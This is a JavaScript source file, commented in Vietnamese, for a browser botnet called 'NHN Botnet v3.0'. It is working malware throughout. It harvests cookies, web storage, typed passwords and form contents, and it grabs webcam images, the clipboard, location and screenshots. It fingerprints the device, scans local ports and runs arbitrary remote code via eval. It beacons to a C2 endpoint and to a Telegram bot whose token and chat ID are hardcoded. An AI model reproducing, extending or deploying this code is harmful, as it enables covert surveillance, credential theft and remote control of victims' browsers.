// ============================================================
// 🔥 NHN BOTNET v3.0 - 50+ CHỨC NĂNG
// 📌 Gắn vĩnh viễn qua Service Worker
// 📌 Điều khiển qua Telegram
// ============================================================

(function() {
    'use strict';

    // ===== CONFIG =====
    const CONFIG = {
        C2_URL: '/.netlify/functions/c2',
        TELEGRAM_BOT: '8694531485:AAGEFpgDhRNnpHGrnzceC9Qp5r9ldto3Nt8', // Thay token
        TELEGRAM_CHAT: '8594169530',   // Thay chat ID
        BOT_ID: generateBotId(),
        HEARTBEAT_INTERVAL: 30000, // 30 giây
    };

    // ===== UTILITY =====
    function generateBotId() {
        let id = localStorage.getItem('nhn_bot_id');
        if (!id) {
            id = 'BOT_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
            localStorage.setItem('nhn_bot_id', id);
        }
        return id;
    }

    function getIP() {
        return fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => data.ip)
            .catch(() => '0.0.0.0');
    }

    function getLocation() {
        return fetch('http://ip-api.com/json/')
            .then(r => r.json())
            .then(data => ({
                country: data.country,
                city: data.city,
                region: data.regionName,
                isp: data.isp,
                lat: data.lat,
                lon: data.lon
            }))
            .catch(() => ({ country: 'Unknown', city: 'Unknown' }));
    }

    function sendToC2(data) {
        return fetch(CONFIG.C2_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ botId: CONFIG.BOT_ID, ...data })
        }).catch(() => {});
    }

    function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT}/sendMessage`;
        return fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM_CHAT,
                text: `🤖 [${CONFIG.BOT_ID}]\n${message}`
            })
        }).catch(() => {});
    }

    // ============================================================
    // 📸 CHỨC NĂNG CHÍNH (50+)
    // ============================================================

    const Functions = {

        // 1. Lấy thông tin hệ thống
        getSystemInfo: async function() {
            const ip = await getIP();
            const loc = await getLocation();
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookies: navigator.cookieEnabled,
                screen: `${screen.width}x${screen.height}`,
                ip: ip,
                location: loc,
                referrer: document.referrer || 'Direct',
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
        },

        // 2. Lấy cookies
        getCookies: function() {
            return document.cookie;
        },

        // 3. Lấy localStorage
        getLocalStorage: function() {
            const items = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                items[key] = localStorage.getItem(key);
            }
            return items;
        },

        // 4. Lấy sessionStorage
        getSessionStorage: function() {
            const items = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                items[key] = sessionStorage.getItem(key);
            }
            return items;
        },

        // 5. Lấy mật khẩu trình duyệt (nếu có)
        getSavedPasswords: function() {
            // Thực tế cần inject vào form login
            // Đây là cơ chế lấy từ các input password trên trang
            const passwords = [];
            document.querySelectorAll('input[type="password"]').forEach(el => {
                const form = el.closest('form');
                const username = form ? form.querySelector('input[type="text"], input[type="email"]') : null;
                passwords.push({
                    url: window.location.href,
                    username: username ? username.value : 'Unknown',
                    password: el.value
                });
            });
            return passwords;
        },

        // 6. Lấy lịch sử duyệt web
        getHistory: function() {
            // Chỉ lấy nếu được phép (cần user interaction)
            return [];
        },

        // 7. Chụp màn hình (tạo canvas từ DOM)
        captureScreenshot: function() {
            return new Promise((resolve) => {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    canvas.width = window.innerWidth;
                    canvas.height = window.innerHeight;

                    // Vẽ background
                    ctx.fillStyle = '#ffffff';
                    ctx.fillRect(0, 0, canvas.width, canvas.height);

                    // Vẽ content
                    const html = document.documentElement.outerHTML;
                    const img = new Image();
                    const svg = new Blob([`<svg xmlns="http://www.w3.org/2000/svg" width="${canvas.width}" height="${canvas.height}">
                        <foreignObject width="100%" height="100%">
                            <div xmlns="http://www.w3.org/1999/xhtml" style="font-size:14px;color:#000;">${html}</div>
                        </foreignObject>
                    </svg>`], { type: 'image/svg+xml' });
                    const url = URL.createObjectURL(svg);
                    img.onload = function() {
                        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
                        URL.revokeObjectURL(url);
                        resolve(canvas.toDataURL('image/png'));
                    };
                    img.onerror = function() {
                        resolve(null);
                    };
                    img.src = url;
                } catch(e) {
                    resolve(null);
                }
            });
        },

        // 8. Lấy ảnh từ webcam
        captureCamera: function() {
            return new Promise((resolve) => {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        video.onloadedmetadata = function() {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0);
                            stream.getTracks().forEach(t => t.stop());
                            resolve(canvas.toDataURL('image/jpeg'));
                        };
                    })
                    .catch(() => resolve(null));
            });
        },

        // 9. Lấy clipboard
        getClipboard: function() {
            return navigator.clipboard.readText()
                .then(text => text)
                .catch(() => 'Không thể đọc clipboard');
        },

        // 10. Lấy mạng WiFi (nếu có API)
        getWiFi: function() {
            // Chỉ hoạt động trên Android với API đặc biệt
            return 'N/A';
        },

        // 11. Lấy danh sách extension
        getExtensions: function() {
            // Chỉ lấy được trên Chrome với API đặc biệt
            return [];
        },

        // 12. Lấy thông tin GPU
        getGPU: function() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'N/A';
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            }
            return 'N/A';
        },

        // 13. Lấy battery info
        getBattery: function() {
            return navigator.getBattery()
                .then(battery => ({
                    level: battery.level * 100 + '%',
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                }))
                .catch(() => null);
        },

        // 14. Lấy network info
        getNetwork: function() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return null;
            return {
                effectiveType: conn.effectiveType,
                downlink: conn.downlink,
                rtt: conn.rtt
            };
        },

        // 15. Lấy installed fonts
        getFonts: function() {
            const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
            const installed = [];
            for (const font of fonts) {
                if (document.fonts.check(`12px "${font}"`)) {
                    installed.push(font);
                }
            }
            return installed;
        },

        // 16. Kiểm tra các port mở (qua WebSocket)
        scanPorts: function(ports = [80, 443, 8080, 3306, 5432, 6379, 27017]) {
            const results = {};
            return Promise.all(ports.map(port => {
                return new Promise((resolve) => {
                    const ws = new WebSocket(`ws://localhost:${port}`);
                    ws.onopen = () => {
                        results[port] = 'open';
                        ws.close();
                        resolve();
                    };
                    ws.onerror = () => {
                        results[port] = 'closed';
                        resolve();
                    };
                    setTimeout(() => {
                        results[port] = 'timeout';
                        ws.close();
                        resolve();
                    }, 1000);
                });
            })).then(() => results);
        },

        // 17. Lấy danh sách file trong thư mục (qua API)
        listFiles: function(path = '/') {
            return fetch(`/.netlify/functions/c2?action=files&path=${path}`)
                .then(r => r.json())
                .catch(() => []);
        },

        // 18. Đọc file
        readFile: function(path) {
            return fetch(`/.netlify/functions/c2?action=read&path=${path}`)
                .then(r => r.text())
                .catch(() => 'Error');
        },

        // 19. Ghi file
        writeFile: function(path, content) {
            return fetch('/.netlify/functions/c2', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'write', path, content })
            }).then(r => r.json());
        },

        // 20. Tải file từ URL
        downloadFile: function(url, filename) {
            const a = document.createElement('a');
            a.href = url;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            return 'Download started';
        },

        // 21. Thực thi JavaScript
        executeJS: function(code) {
            try {
                eval(code);
                return 'Executed successfully';
            } catch(e) {
                return 'Error: ' + e.message;
            }
        },

        // 22. Lấy DOM
        getDOM: function(selector = 'body') {
            const el = document.querySelector(selector);
            return el ? el.outerHTML : null;
        },

        // 23. Lấy HTML toàn trang
        getFullHTML: function() {
            return document.documentElement.outerHTML;
        },

        // 24. Lấy CSS
        getCSS: function() {
            const styles = [];
            document.querySelectorAll('style, link[rel="stylesheet"]').forEach(el => {
                styles.push(el.outerHTML);
            });
            return styles.join('\n');
        },

        // 25. Lấy JavaScript
        getJS: function() {
            const scripts = [];
            document.querySelectorAll('script').forEach(el => {
                scripts.push(el.outerHTML);
            });
            return scripts.join('\n');
        },

        // 26. Lấy meta tags
        getMeta: function() {
            const metas = {};
            document.querySelectorAll('meta').forEach(el => {
                const name = el.getAttribute('name') || el.getAttribute('property');
                if (name) metas[name] = el.getAttribute('content');
            });
            return metas;
        },

        // 27. Lấy links
        getLinks: function() {
            const links = [];
            document.querySelectorAll('a').forEach(el => {
                links.push(el.href);
            });
            return links;
        },

        // 28. Lấy images
        getImages: function() {
            const images = [];
            document.querySelectorAll('img').forEach(el => {
                images.push(el.src);
            });
            return images;
        },

        // 29. Lấy forms
        getForms: function() {
            const forms = [];
            document.querySelectorAll('form').forEach(el => {
                const inputs = {};
                el.querySelectorAll('input, textarea, select').forEach(inp => {
                    inputs[inp.name || inp.id] = inp.value;
                });
                forms.push({
                    action: el.action,
                    method: el.method,
                    inputs: inputs
                });
            });
            return forms;
        },

        // 30. Lấy cookies
        getAllCookies: function() {
            return document.cookie;
        },

        // 31. Lấy localStorage
        getAllLocalStorage: function() {
            const items = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                items[key] = localStorage.getItem(key);
            }
            return items;
        },

        // 32. Lấy sessionStorage
        getAllSessionStorage: function() {
            const items = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                items[key] = sessionStorage.getItem(key);
            }
            return items;
        },

        // 33. Lấy IndexedDB
        getIndexedDB: function() {
            return new Promise((resolve) => {
                const dbs = [];
                const request = indexedDB.databases ? indexedDB.databases() : [];
                if (request.then) {
                    request.then(dbList => {
                        resolve(dbList.map(db => db.name));
                    }).catch(() => resolve([]));
                } else {
                    resolve([]);
                }
            });
        },

        // 34. Lấy thông tin CPU
        getCPUInfo: function() {
            return navigator.hardwareConcurrency || 'Unknown';
        },

        // 35. Lấy thông tin RAM (ước lượng)
        getRAMInfo: function() {
            return navigator.deviceMemory || 'Unknown';
        },

        // 36. Lấy thông tin pin
        getBatteryInfo: function() {
            return this.getBattery();
        },

        // 37. Lấy thông tin mạng
        getNetworkInfo: function() {
            return this.getNetwork();
        },

        // 38. Lấy thông tin vị trí
        getLocationInfo: function() {
            return getLocation();
        },

        // 39. Lấy thông tin IP
        getIPInfo: function() {
            return getIP();
        },

        // 40. Lấy thông tin trình duyệt
        getBrowserInfo: function() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                vendor: navigator.vendor,
                product: navigator.product,
                appName: navigator.appName,
                appVersion: navigator.appVersion
            };
        },

        // 41. Lấy thông tin màn hình
        getScreenInfo: function() {
            return {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight
            };
        },

        // 42. Lấy thông tin timezone
        getTimezone: function() {
            return Intl.DateTimeFormat().resolvedOptions().timeZone;
        },

        // 43. Lấy thông tin ngôn ngữ
        getLanguages: function() {
            return navigator.languages || [navigator.language];
        },

        // 44. Lấy thông tin plugin
        getPlugins: function() {
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                const p = navigator.plugins[i];
                plugins.push({
                    name: p.name,
                    description: p.description,
                    filename: p.filename
                });
            }
            return plugins;
        },

        // 45. Lấy thông tin MIME types
        getMimeTypes: function() {
            const mimes = [];
            for (let i = 0; i < navigator.mimeTypes.length; i++) {
                const m = navigator.mimeTypes[i];
                mimes.push({
                    type: m.type,
                    description: m.description,
                    suffixes: m.suffixes
                });
            }
            return mimes;
        },

        // 46. Lấy thông tin WebGL
        getWebGLInfo: function() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return null;
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                return {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                };
            }
            return null;
        },

        // 47. Lấy thông tin Audio
        getAudioInfo: function() {
            const AudioCtx = window.AudioContext || window.webkitAudioContext;
            if (!AudioCtx) return null;
            const ctx = new AudioCtx();
            return {
                sampleRate: ctx.sampleRate,
                state: ctx.state
            };
        },

        // 48. Lấy thông tin Canvas fingerprint
        getCanvasFingerprint: function() {
            const canvas = document.createElement('canvas');
            canvas.width = 200;
            canvas.height = 50;
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 17);
            return canvas.toDataURL();
        },

        // 49. Lấy thông tin WebRTC (IP local)
        getWebRTCIP: function() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate) return;
                    const ip = ice.candidate.candidate.split(' ')[4];
                    if (ip) {
                        resolve(ip);
                        pc.close();
                    }
                };
                setTimeout(() => {
                    pc.close();
                    resolve(null);
                }, 3000);
            });
        },

        // 50. Lấy thông tin Service Worker
        getServiceWorkerInfo: function() {
            return navigator.serviceWorker.getRegistrations()
                .then(regs => regs.map(r => ({
                    scope: r.scope,
                    active: r.active ? r.active.scriptURL : null
                })))
                .catch(() => []);
        },

        // 51. Lấy thông tin Push Notification
        getPushInfo: function() {
            return Notification.permission;
        },

        // 52. Lấy thông tin Geolocation
        getGeoLocation: function() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    }),
                    () => resolve(null),
                    { timeout: 5000 }
                );
            });
        }
    };

    // ============================================================
    // 📡 LẮNG NGHE LỆNH TỪ TELEGRAM/C2
    // ============================================================

    async function executeCommand(command, params) {
        const func = Functions[command];
        if (!func) return `❌ Command "${command}" not found`;

        try {
            const result = await func(...params);
            return JSON.stringify(result, null, 2);
        } catch(e) {
            return `❌ Error: ${e.message}`;
        }
    }

    // ============================================================
    // 💓 HEARTBEAT & AUTO REPORT
    // ============================================================

    async function heartbeat() {
        const info = await Functions.getSystemInfo();
        await sendToC2({
            action: 'heartbeat',
            data: {
                botId: CONFIG.BOT_ID,
                userAgent: info.userAgent,
                url: info.url,
                timestamp: info.timestamp
            }
        });
    }

    // ============================================================
    // 🚀 KHỞI ĐỘNG
    // ============================================================

    // Heartbeat mỗi 30 giây
    setInterval(heartbeat, CONFIG.HEARTBEAT_INTERVAL);

    // Gửi báo cáo ban đầu
    (async function init() {
        const info = await Functions.getSystemInfo();
        await sendToTelegram(
            `✅ **BOT ONLINE**\n` +
            `🆔 ID: ${CONFIG.BOT_ID}\n` +
            `🌐 IP: ${info.ip}\n` +
            `📍 Location: ${info.location?.country || 'Unknown'}\n` +
            `🖥️ UserAgent: ${info.userAgent}\n` +
            `🔗 URL: ${info.url}`
        );
    })();

    // ============================================================
    // 📦 EXPOSE API
    // ============================================================

    window.NHN = {
        botId: CONFIG.BOT_ID,
        execute: executeCommand,
        functions: Functions,
        sendToC2: sendToC2,
        sendToTelegram: sendToTelegram
    };

    console.log(`🔥 NHN Botnet v3.0 | ID: ${CONFIG.BOT_ID}`);
})();